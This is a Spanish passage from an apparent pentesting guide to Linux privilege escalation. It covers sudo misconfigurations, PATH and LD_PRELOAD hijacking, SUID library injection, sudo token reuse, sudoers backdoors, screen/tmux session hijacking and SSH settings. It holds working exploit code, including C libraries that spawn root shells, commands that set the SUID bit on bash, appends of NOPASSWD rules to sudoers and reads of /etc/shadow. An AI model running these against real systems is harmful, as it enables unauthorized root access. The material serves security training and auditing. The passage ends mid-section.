Se pueden proporcionar variables de Terraform mediante variables de entorno `TF_VAR_<name>` si la regla específica de sudo las conserva. Para leer a través de un symlink de origen, también se necesita un provider que siga el enlace y copie el resultado protegido a un destino legible por quien invoca el proceso. Por separado, para escribir a través de un symlink de destino se necesita una entrada de destino controlada por quien invoca el proceso y un provider con privilegios que siga el enlace al escribir; un job programado posterior es solo una de las posibles consecuencias. Inspecciona la concesión exacta de sudo, los archivos `.tf` pertinentes, la configuración de CLI seleccionada y la propiedad de las rutas con comandos de solo lectura como `sudo -l`, `stat` y `readlink` antes de probar cualquiera de las dos vías. Las validaciones léxicas débiles, como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, no resuelven los symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform resuelve el symlink y copia el archivo real `/root/root.txt` en un destino legible por el atacante. El mismo enfoque se puede usar para **escribir** en rutas privilegiadas creando previamente symlinks en el destino (por ejemplo, apuntando la ruta de destino del provider a un directorio dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo se puede configurar con `requiretty`, lo que obliga a ejecutar sudo únicamente desde una TTY interactiva. Si se establece `!requiretty` (o la opción está ausente), sudo se puede ejecutar desde contextos no interactivos, como reverse shells, trabajos cron o scripts.

```bash
Defaults !requiretty
```

Esto no es una vulnerabilidad directa por sí sola, pero amplía las situaciones en las que se pueden abusar las reglas de sudo sin necesitar una PTY completa.

### Sudo env_keep+=PATH / secure_path inseguro → secuestro de PATH

Si `sudo -l` muestra `env_keep+=PATH` o un `secure_path` que contiene entradas modificables por el atacante (p. ej., `/home/<user>/bin`), se puede suplantar un comando externo sin calificar dentro del destino permitido por sudo.<sup>[[3]](#references)</sup> La ausencia de un `secure_path` efectivo también merece revisión **si** el entorno de sudo conserva un `PATH` controlado por quien invoca el comando; la ausencia, por sí sola, no demuestra que así sea. Lee el script permitido sin ejecutarlo y, después, verifica la regla exacta de RunAs y argumentos, la ruta de búsqueda de comandos efectiva y la existencia de un directorio anterior, modificable y con permisos de recorrido, que contenga el nombre del comando. La autenticación, `NOEXEC`, los builtins del shell y las rutas absolutas a comandos pueden cambiar el resultado.

- Requisitos: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que invoque comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada de PATH modificable que se busque primero.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Omisión de rutas en la ejecución de Sudo
**Salta** para leer otros archivos o usa **symlinks**. Por ejemplo, en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Si se usa un **comodín** (\*), es aún más fácil:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID sin ruta al comando

Si se concede el **permiso de sudo** para un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_, puedes explotarlo cambiando la variable PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Esta técnica también se puede usar si un binario **suid** **ejecuta otro comando sin especificar la ruta (comprueba siempre con** _**strings**_ **el contenido de un binario SUID sospechoso)**.

[Ejemplos de payloads para ejecutar.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binario SUID con ruta al comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, puedes intentar **exportar una función** con el nombre del comando que está ejecutando el archivo suid.

Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_, tienes que intentar crear la función y exportarla:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Luego, cuando llames al binario suid, se ejecutará esta función

### Wrappers personalizados de copia SUID

Una utilidad SUID propiedad de root que acepta rutas de origen y destino puede cruzar dos límites de confianza distintos. Si construye un comando de shell a partir de cualquiera de los argumentos (por ejemplo, pasando un comando `cp` construido a `system()`), los metacaracteres del shell pueden ejecutar otro comando con sus privilegios efectivos. Aunque invoque `cp` de forma segura, sin usar un shell, un destino sin restricciones puede permitir escrituras privilegiadas arbitrarias en archivos como `/etc/passwd`. Revisa el manejo de argumentos del wrapper, el comportamiento del UID efectivo, las restricciones del destino y si el archivo copiado conserva el contenido controlado por el llamante; un error genérico de `cp` o el bit SUID por sí solos no demuestran ninguna de las dos posibilidades. Enumera el binario y sus permisos de forma pasiva antes de realizar pruebas manuales.

### Script escribible ejecutado por un wrapper SUID

Una configuración incorrecta común en aplicaciones personalizadas es un wrapper binario SUID propiedad de root que ejecuta un script, mientras que el script tiene permisos de escritura para usuarios con pocos privilegios.

Patrón típico:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Si se puede escribir en `/usr/local/bin/backup.sh`, puedes añadir comandos de payload y luego ejecutar el wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Comprobaciones rápidas:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Esta ruta de ataque es especialmente común en wrappers de «mantenimiento»/«backup» incluidos en `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se utiliza para especificar una o más bibliotecas compartidas (archivos .so) que el cargador debe cargar antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.

Sin embargo, para mantener la seguridad del sistema y evitar que se abuse de esta función, especialmente con ejecutables **suid/sgid**, el sistema impone ciertas condiciones:

- El cargador ignora **LD_PRELOAD** en los ejecutables cuyo ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
- En los ejecutables con suid/sgid, solo se precargan las bibliotecas ubicadas en rutas estándar que también tengan suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la instrucción **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** se conserve y se reconozca incluso al ejecutar comandos con `sudo`, lo que puede llevar a la ejecución de código arbitrario con privilegios elevados.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Guardar como **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Luego **compílalo** usando:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finalmente, **escalate privileges** ejecutando

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Se puede abusar de un privesc similar si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, porque controla la ruta donde se buscarán las bibliotecas.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binario SUID – .so injection

Cuando encuentres un binario con permisos **SUID** que parezca inusual, es recomendable comprobar si está cargando correctamente los archivos **.so**. Puedes verificarlo ejecutando el siguiente comando:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Por ejemplo, encontrar un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere una posible vía de explotación.

Para aprovecharlo, se crearía un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando los permisos de los archivos y ejecutando un shell con privilegios elevados.

Compila el archivo C anterior en un archivo shared object (.so) con:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Finalmente, ejecutar el binario SUID afectado debería activar el exploit, lo que podría comprometer el sistema.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta en la que podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Si recibes un error como♀♀♀♀♀♀

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

eso significa que la biblioteca que has generado debe tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista seleccionada de binarios de Unix que un atacante puede explotar para eludir las restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo, pero para los casos en los que **solo puedes inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de los binarios de Unix que se pueden abusar para escapar de shells restringidas, escalar o mantener privilegios elevados, transferir archivos, iniciar bind y reverse shells, y facilitar otras tareas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes acceder a `sudo -l`, puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reutilizar tokens de Sudo

En los casos en los que tienes **acceso a sudo** pero no conoces la contraseña, puedes escalar privilegios **esperando a que se ejecute un comando sudo y luego secuestrando el token de la sesión**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilegios:

- Ya tienes una shell como usuario "_sampleuser_"
- "_sampleuser_" ha **usado `sudo`** para ejecutar algo en los **últimos 15 minutos** (por defecto, esa es la duración del token de sudo, que nos permite usar `sudo` sin introducir una contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` devuelve 0
- `gdb` está disponible (debes poder subirlo)

(Puedes habilitar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` y establecer `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token de sudo en tu sesión** (no obtendrás automáticamente una shell de root; ejecuta `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- El **segundo exploit** (`exploit_v2.sh`) creará un shell sh en _/tmp_ **propiedad de root con setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- El **tercer exploit** (`exploit_v3.sh`) **creará un archivo sudoers** que hace que los **tokens de sudo sean eternos y permite que todos los usuarios usen sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o en cualquiera de los archivos creados dentro de ella, puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un token sudo para un usuario y un PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios sudo** sin necesidad de conocer la contraseña haciendo lo siguiente:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo, podrías **obtener información interesante** y, si puedes **escribir** en cualquier archivo, podrás **escalar privilegios**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Si puedes escribir, puedes abusar de este permiso.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Otra forma de abusar de estos permisos:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Existen algunas alternativas al binario `sudo`, como `doas` para OpenBSD. Recuerda revisar su configuración en `/etc/doas.conf`.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Si `doas` permite usar un editor o intérprete, comprueba las técnicas de escape al estilo de GTFOBins:

```bash
doas vim
:!/bin/sh
```

Una regla de `doas` que permite ejecutar como root también merece revisar la ruta de plugins del `dstat` original basado en Python. Su [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) y su [código fuente](https://github.com/dstat-real/dstat/blob/master/dstat) incluyen `/usr/share/dstat/` y `/usr/local/share/dstat/` entre las ubicaciones de los plugins `dstat_*.py`. Si el usuario actual puede escribir en una ubicación que la versión instalada realmente utilice y recorrerla, un plugin seleccionado podría ejecutarse con la identidad RunAs de `doas`. Confirma la regla efectiva, la búsqueda de plugins en esa versión, los permisos o ACL del directorio y sus directorios padre, y si quien ejecuta el comando puede seleccionar un plugin; una regla de `dstat` o un directorio escribible, por sí solos, son solo una pista. Otras implementaciones de `dstat` pueden usar sistemas de plugins diferentes. Inspecciona los metadatos de forma pasiva, sin cargar ningún plugin.

### Sudo Hijacking

Si sabes que un **usuario suele conectarse a una máquina y usar `sudo`** para escalar privilegios y has conseguido una shell en el contexto de ese usuario, puedes **crear un nuevo ejecutable de sudo** que ejecute tu código como root y luego el comando del usuario. Después, **modifica el $PATH** del contexto del usuario (por ejemplo, añadiendo la nueva ruta en .bash_profile) para que, cuando el usuario ejecute sudo, se ejecute tu ejecutable de sudo.

Ten en cuenta que, si el usuario utiliza otra shell (que no sea bash), tendrás que modificar otros archivos para añadir la nueva ruta. Por ejemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc` y `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py).

O ejecutando algo como:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteca compartida

### ld.so

El archivo `/etc/ld.so.conf` indica **de dónde provienen los archivos de configuración cargados**. Normalmente, este archivo contiene la siguiente ruta: `include /etc/ld.so.conf.d/*.conf`

Esto significa que se leerán los archivos de configuración de `/etc/ld.so.conf.d/*.conf`. Estos archivos de configuración **señalan otras carpetas** donde se **buscarán** las **bibliotecas**. Por ejemplo, el contenido de `/etc/ld.so.conf.d/libc.conf` es `/usr/local/lib`. **Esto significa que el sistema buscará bibliotecas dentro de `/usr/local/lib`**.

Si por alguna razón **un usuario tiene permisos de escritura** en cualquiera de las rutas indicadas —`/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta indicada en un archivo de configuración dentro de `/etc/ld.so.conf.d/*.conf`—, puede que pueda escalar privilegios.\
Echa un vistazo a **cómo explotar esta configuración incorrecta** en la siguiente página:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Al copiar la biblioteca en `/var/tmp/flag15/`, el programa la utilizará desde esta ubicación, según lo especificado en la variable `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Las capabilities de Linux proporcionan **un subconjunto de los privilegios de root disponibles para un proceso**. Esto divide eficazmente los **privilegios de root en unidades más pequeñas y diferenciadas**. Luego, cada una de estas unidades puede otorgarse de forma independiente a los procesos. De esta manera, se reduce el conjunto completo de privilegios y, con ello, los riesgos de explotación.\
Lee la siguiente página para **obtener más información sobre las capabilities y cómo abusar de ellas**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

En un directorio, el **bit de «ejecución»** implica que el usuario afectado puede hacer «**cd**» a la carpeta.\
El bit de **«lectura»** implica que el usuario puede **listar** los **archivos**, y el bit de **«escritura»** implica que puede **eliminar** y **crear** nuevos **archivos**.

## ACLs

Las Access Control Lists (ACLs) representan la capa secundaria de permisos discrecionales, capaces de **anular los permisos ugo/rwx tradicionales**. Estos permisos mejoran el control del acceso a archivos o directorios al permitir o denegar derechos a usuarios específicos que no son los propietarios ni forman parte del grupo. Este nivel de **granularidad garantiza una gestión de acceso más precisa**. Puedes encontrar más detalles [**aquí**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Concede** al usuario «kali» permisos de lectura y escritura sobre un archivo:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Obtener** archivos con ACLs específicos del sistema:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor de ACL oculta en archivos adicionales de sudoers

Una configuración incorrecta común es un archivo propiedad de root en `/etc/sudoers.d/` con permisos `440` que aun así concede acceso de escritura a un usuario con pocos privilegios mediante ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Si ves algo como `user:alice:rw-`, el usuario puede añadir una regla de sudo a pesar de los bits de modo restrictivos:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Este es un vector de persistencia/privesc de alto impacto basado en ACL, ya que es fácil pasarlo por alto en revisiones que solo usan `ls -l`.

## Sesiones de shell abiertas

El acceso a sesiones de GNU Screen entre usuarios depende de la **configuración y las ACL de la sesión en ejecución**, no solo de su versión. [GNU Screen documenta](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) que debe compilarse con soporte multiusuario; `multiuser on` y un permiso `acladd` o `aclchg` adecuado permiten que otro usuario se conecte. [El manual también requiere setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) para buscar sesiones entre usuarios. Un socket visible propiedad de root o un binario `screen` SUID, por sí solos, no demuestran que haya una shell de root a la que se pueda conectar. Antes de considerarlo una escalada, confirma que la sesión activa sea multiusuario, que el usuario actual tenga permisos efectivos de entrada/comando y que la shell de esa sesión se ejecute como el propietario privilegiado.

### Hijacking de sesiones de screen

**Listar sesiones de screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![secuestro de sesiones de screen - Ubicaciones de sockets (algunos sistemas exponen uno como enlace simbólico del otro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Conectarse a una sesión**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Secuestro de sesiones tmux

Esto era un problema de las **versiones antiguas de tmux**. No pude secuestrar como usuario sin privilegios una sesión de tmux (v2.1) creada por root.

**Listar sesiones de tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Ubicaciones de sockets (algunos sistemas exponen uno como symlink del otro) - secuestro de sesiones tmux: tmux -S /tmp/dev sess ls Lista las sesiones usando ese socket; puedes iniciar una sesión tmux en ese socket...](<../../images/image (837).png>)

**Conectarse a una sesión**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Consulta **Valentine box de HTB** para ver un ejemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Las claves generadas con compilaciones de OpenSSL afectadas de Debian o sus derivados durante el período histórico vulnerable pueden tener aleatoriedad predecible; la distribución actual del host o una versión parcheada de OpenSSL no permite determinar cómo se generó una clave anterior. Comprueba la **clave específica** con una lista negra histórica adecuada y verifica su procedencia. El [manual de `ssh-vulnkey` de Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) describe cómo comprobar claves públicas y `authorized_keys`, y [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) documenta la corrección de OpenSSL. Una entrada en el `authorized_keys` de una cuenta privilegiada solo es una pista de escalación si se puede recuperar la clave privada coincidente y la política efectiva de SSH sigue aceptando esa clave para esa cuenta; una clave de **host** débil no es por sí misma una credencial de inicio de sesión. Sustituye las claves comprometidas y elimina las autorizaciones antiguas.

### Valores de configuración interesantes de SSH

- **PasswordAuthentication:** Especifica si se permite la autenticación mediante contraseña. El valor predeterminado de OpenSSH upstream es `yes`; la configuración de la distribución puede anularlo.
- **PubkeyAuthentication:** Especifica si se permite la autenticación mediante clave pública. El valor predeterminado es `yes`.
- **PermitEmptyPasswords**: Cuando se permite la autenticación mediante contraseña, especifica si el servidor permite iniciar sesión en cuentas con contraseñas vacías. El valor predeterminado es `no`.

### Archivos de control de inicio de sesión

Estos archivos influyen en quién puede iniciar sesión y cómo:

- **`/etc/nologin`**: si existe, bloquea los inicios de sesión que no sean de root y muestra su mensaje.
- **`/etc/securetty`**: restringe desde dónde puede iniciar sesión root (lista de TTY permitidos).
- **`/etc/motd`**: banner posterior al inicio de sesión (puede filtrar información del entorno o de mantenimiento).

### PermitRootLogin

Especifica si root puede iniciar sesión mediante ssh. El valor predeterminado de OpenSSH upstream es `prohibit-password`; la configuración de la distribución puede anularlo. Valores posibles:

- `yes`: root puede iniciar sesión mediante contraseña y clave privada
- `without-password` o `prohibit-password`: root solo puede iniciar sesión con una clave privada
- `forced-commands-only`: root solo puede iniciar sesión con una clave privada y si se especifican las opciones de comandos
- `no` : no

### Autoridades de certificación de usuarios SSH de confianza

`TrustedUserCAKeys` indica las claves públicas en las que sshd confía para firmar certificados de **usuario**. Si un usuario con menos privilegios puede leer la clave privada de la CA correspondiente, revisa quién puede obtener un certificado y con qué principals de cuenta podría autenticarse. `AuthorizedPrincipalsFile` o `AuthorizedPrincipalsCommand` pueden restringir los nombres aceptados; si no se configura ninguno, el certificado debe incluir el nombre de la cuenta de destino. `PermitRootLogin prohibit-password` bloquea la autenticación de root mediante contraseña, pero puede permitir la autenticación mediante certificado. La exposición de una ruta a una clave por sí sola no demuestra que haya acceso: confirma el par de claves pública y privada, las reglas `Match` efectivas, la política de la cuenta, la frase de contraseña de la clave, la revocación y los algoritmos de firma aceptados. No incluyas bytes de claves privadas en la salida de enumeración. Consulta el [manual de configuración del servidor OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Una clave privada de CA también puede ser utilizable **sin que el usuario actual pueda leerla** si una regla de delegación de privilegios permite a ese usuario invocar un [firmante de certificados como `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) sin restricciones, con la identidad del propietario de la clave. Relaciona el comando y los argumentos exactos permitidos con el acceso del usuario firmante a la clave, la CA pública de confianza según la configuración efectiva de sshd, el principal aceptado para la cuenta de destino, la validez del certificado y la política de inicio de sesión de esa cuenta. Un comando de firma delegado o un archivo de CA de confianza por sí solos no demuestran que se pueda acceder a otra cuenta; no firmes un certificado de prueba durante la enumeración pasiva.

Para la ruta independiente de confianza de CA por cuenta, consulta [Confusión del delimitador de principal en certificados SSH](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Especifica los archivos que contienen las claves públicas que pueden usarse para la autenticación de usuarios. Puede contener tokens como `%h`, que se sustituirán por el directorio personal. **Se pueden indicar rutas absolutas** (que comienzan por `/`) o **rutas relativas al directorio personal del usuario**. Por ejemplo:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Esa configuración indicará que, si intentas iniciar sesión con la clave **privada** del usuario "**testusername**", ssh comparará la clave pública de tu clave con las que se encuentran en `/home/testusername/.ssh/authorized_keys` y `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

El reenvío del agente SSH te permite **usar tus claves SSH locales en lugar de dejar las claves** (¡sin frases de contraseña!) en tu servidor. Así, podrás **saltar** mediante ssh **a un equipo** y desde allí **saltar a otro** equipo **usando** la **clave** ubicada en tu **equipo inicial**.

Debes establecer esta opción en `$HOME/.ssh.config` de esta manera:

```
Host example.com
  ForwardAgent yes
```

Observa que, si `Host` es `*`, cada vez que el usuario se conecta a otra máquina, ese host podrá acceder a las claves (lo cual es un problema de seguridad).

El archivo `/etc/ssh_config` puede **anular** estas **opciones** y permitir o denegar esta configuración.\
El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío de ssh-agent mediante la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitirlo).

Si descubres que Forward Agent está configurado en un entorno, consulta la siguiente página, ya que **es posible que puedas abusar de ello para escalar privilegios**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Archivos interesantes

### Archivos de perfiles

El archivo `/etc/profile` y los archivos dentro de `/etc/profile.d/` son **scripts que se ejecutan cuando un usuario abre un shell nuevo**. Por lo tanto, si puedes **escribir o modificar cualquiera de ellos, puedes escalar privilegios**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Si encuentras algún script de perfil extraño, deberías comprobar si contiene **datos confidenciales**.

### Archivos Passwd/Shadow

Según el sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` pueden tener otro nombre o puede haber una copia de seguridad. Por eso, se recomienda **encontrarlos todos** y **comprobar si puedes leerlos** para ver **si contienen hashes**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

En algunas ocasiones puedes encontrar **hashes de contraseñas** dentro del archivo `/etc/passwd` (o equivalente)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### /etc/passwd con permisos de escritura

Primero, genera una contraseña con uno de los siguientes comandos.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Luego agrega el usuario `hacker` y la contraseña generada.

```
